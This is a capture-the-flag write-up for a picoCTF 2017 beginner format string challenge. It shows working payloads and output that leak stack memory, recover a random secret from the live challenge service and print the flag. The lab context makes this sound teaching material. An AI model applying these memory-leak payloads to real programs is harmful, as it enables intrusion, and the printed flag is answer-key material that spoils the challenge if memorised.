**Challenge name:** Ive Got A Secret  
**Description:** Hopefully you can find the right format for my secret! Source. Connect on shell2017.picoctf.com:58570.  
**Hint:** This is a beginning format string attack.    
**File(s) provided:**  
- secret (32-bit ELF)
- secret.c (source code)
----
# Step 0: Recon
The program accepts input twice; the first time it just repeats the input, the second time it will compare it to a random value. If the guess is correct, the flag is printed. We will use the format string vulnerability in the first stage to leak the value needed for the second.

# Step 1: Confirm the format tring vulnerability
```bash
# python -c 'print "%08x."*12' | ./secret
Give me something to say!
00000040.f77575a0.08048792.00000001.ff9db254.4a3e03ac.00000003.f77573dc.ff9db1c0.00000000.f75bc276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
```
Note: we read 12 stack values, because the input buffer is 64 bits and we're using 5 bytes per stack value. It is possible to be more efficient (just using ```%x```) and read more values, but it is unlikely that we need to.

# Step 2: Find secret value
If we run the script a couple times, we should be able to see which value is random:
```bash
# for i in {1..10}; do python -c 'print "%08x."*12' | ./secret; done
Give me something to say!
00000040.f779c5a0.08048792.00000001.ff857c54.85278f47.00000003.f779c3dc.ff857bc0.00000000.f7601276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f775f5a0.08048792.00000001.ffdd0814.47e3d221.00000003.f775f3dc.ffdd0780.00000000.f75c4276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f76f75a0.08048792.00000001.ffd8fa04.a4d7c407.00000003.f76f73dc.ffd8f970.00000000.f755c276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f76b65a0.08048792.00000001.ffe24ea4.aa595cdc.00000003.f76b63dc.ffe24e10.00000000.f751b276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f76ef5a0.08048792.00000001.ffa3e8c4.34aeca22.00000003.f76ef3dc.ffa3e830.00000000.f7554276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f77a85a0.08048792.00000001.ffbb6114.94ffefe8.00000003.f77a83dc.ffbb6080.00000000.f760d276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f77675a0.08048792.00000001.fffa8674.ff3453d7.00000003.f77673dc.fffa85e0.00000000.f75cc276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f77375a0.08048792.00000001.ff99d884.77e2e584.00000003.f77373dc.ff99d7f0.00000000.f759c276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f76c15a0.08048792.00000001.ffc37314.080bc9b6.00000003.f76c13dc.ffc37280.00000000.f7526276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
Give me something to say!
00000040.f774c5a0.08048792.00000001.ffc6ec94.ce0b466a.00000003.f774c3dc.ffc6ec00.00000000.f75b1276.00000001.
Now tell my secret in hex! Secret: As my friend says,"You get nothing! You lose! Good day, Sir!"
```
It looks like the 6th value changes every time we run it, so it is likely to be the value we need.
# Step 3: Get flag
Let's make input that makes it easier for us to extract the secret value:  ```%x%x%x%x%x....%08x```  
- 5 ```%x``` because we don't care about the first 5 values
- a couple of dots to mark the separation
- ```%08x``` to pad the secret value with leading zeroes if needed  

Connect to the service, give it the input above, and copy/paste the value after the dots:
``` bash
# nc shell2017.picoctf.com 58570
Give me something to say!
%x%x%x%x%x....%08x
40f7fc7c2080487921ffffdd34....7903523c
Now tell my secret in hex! Secret: 7903523c
326edd4743c7046d72d29e911ae8a412
Wow, you got it!
```
# Step 4: Sidenote
If you want to use python to generate the first input and manually enter the second one, you'll need to keep the pipe open. That can be done as follows:
``` bash
# cat <(python -c 'print "%08x."*6') - | ./secret
```
